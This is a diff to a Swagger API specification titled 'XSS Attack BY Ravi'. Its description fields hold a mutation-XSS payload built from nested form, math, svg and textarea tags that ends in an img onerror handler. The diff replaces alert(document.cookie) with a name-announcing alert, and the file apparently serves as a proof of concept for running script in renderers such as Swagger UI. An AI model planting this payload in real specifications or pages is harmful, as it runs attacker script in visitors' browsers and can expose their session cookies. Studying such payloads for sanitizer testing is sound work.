@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY Ravi
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("Hello I am Ravi5hanka") src=1>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -20,14 +20,14 @@ paths:
         '200':
           description: No response was specified
       tags:
-        - M0X0101_XSS_D
+        - Ravi_XSS_D
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("Hello I am Ravi5hanka") src=1>"></form>
           format: int64
           in: path
           name: id
